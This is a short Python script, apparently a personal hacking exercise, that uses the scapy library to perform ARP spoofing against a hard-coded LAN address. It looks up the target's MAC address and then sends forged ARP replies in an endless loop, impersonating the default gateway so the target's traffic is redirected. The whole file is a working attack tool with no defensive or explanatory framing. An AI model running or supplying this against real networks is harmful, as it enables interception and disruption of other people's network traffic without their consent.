import time

import scapy.all as scapy
  
  
def spoof(Target_Ip, Target_Mac, spoof_ip): 
   spoofed_arp_packet = scapy.ARP(pdst=Target_Ip,hwdst=Target_Mac, psrc=spoof_ip, op="is-at")
   scapy.send(spoofed_arp_packet)
    
    
    
def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip)
    reply,_=scapy.srp(arp_request,timeout = 3, verbose=0)
    if reply:
        return reply[0][1].src
    return None


Target_Ip = "192.168.0.89" 
Default_Gateway = "192.168.0.254"




 

Target_Mac = None
while not Target_Mac:
    Target_Mac=get_mac(Target_Ip)
    if not Target_Mac:
        print("MAC adress for target not found\n")
print("target mac adress is {} ".format(Target_Mac))

while True:
     spoof(Target_Ip,Target_Mac,Default_Gateway)
     print("spoofing is active")